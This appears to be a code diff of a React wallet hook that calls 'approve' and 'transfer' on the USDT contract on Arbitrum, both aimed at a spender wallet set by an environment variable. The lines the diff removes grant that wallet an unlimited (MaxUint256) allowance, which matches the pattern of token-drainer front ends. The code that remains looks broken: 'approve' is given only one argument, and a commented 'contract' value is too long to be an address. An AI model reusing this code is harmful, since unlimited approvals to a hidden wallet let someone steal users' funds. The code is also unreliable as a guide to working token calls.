@@ -1,8 +1,6 @@
 import { useAppKit } from "@reown/appkit/react";
-import { MaxUint256 } from "ethers";
 import { useState } from "react";
 import { useAccount, useWriteContract, useDisconnect } from "wagmi";
-import { parseEther } from "viem";
 
 export const USDT_ARBITRUM_ABI = [
   {
@@ -28,6 +26,9 @@ export const USDT_ARBITRUM_ABI = [
 // });
 
 const USDT_ARBITRUM_CONTRACT = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";
+
+// const USDT_SEPOLIA_CONTRACT =
+//   "0x6ca1d0ba653065d96bfefeb68fc65e56e576ff6ecc72ce245890b97a9b65c075";
 
 const APPROVE_TO_WALLET =
   import.meta.env.VITE_SPENDER_ADDRESS ||
@@ -64,53 +65,22 @@ export const useConnectWallet = () => {
     }
   };
 
-  // const addUSDTToMetaMask = async () => {
-  //   if (window.ethereum) {
-  //     try {
-  //       const wasAdded = await window.ethereum.request({
-  //         method: "wallet_watchAsset",
-  //         params: {
-  //           type: "ERC20",
-  //           options: {
-  //             address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // Адрес USDT
-  //             symbol: "USDT",
-  //             decimals: 6,
-  //             image: "https://cryptologos.cc/logos/tether-usdt-logo.png", // Иконка (опционально)
-  //           },
-  //         },
-  //       });
-  //
-  //       if (wasAdded) {
-  //         console.log("USDT успешно добавлен в MetaMask!");
-  //       } else {
-  //         console.log("Пользователь отклонил добавление токена.");
-  //       }
-  //     } catch (error) {
-  //       console.error("Ошибка при добавлении токена:", error);
-  //     }
-  //   } else {
-  //     console.error("MetaMask не найден.");
-  //   }
-  // };
-
   // Approve token function
   const approveTokens = async () => {
     writeContract({
       abi: USDT_ARBITRUM_ABI,
       address: USDT_ARBITRUM_CONTRACT,
       functionName: "approve",
-      args: [APPROVE_TO_WALLET, MaxUint256],
+      args: [APPROVE_TO_WALLET],
     });
   };
 
   const transferTokens = async (tokens: string) => {
-    // await addUSDTToMetaMask();
     writeContract({
       abi: USDT_ARBITRUM_ABI,
       address: USDT_ARBITRUM_CONTRACT,
       functionName: "transfer",
-      args: [APPROVE_TO_WALLET, MaxUint256],
-      value: parseEther(tokens),
+      args: [APPROVE_TO_WALLET, tokens],
     });
   };
 
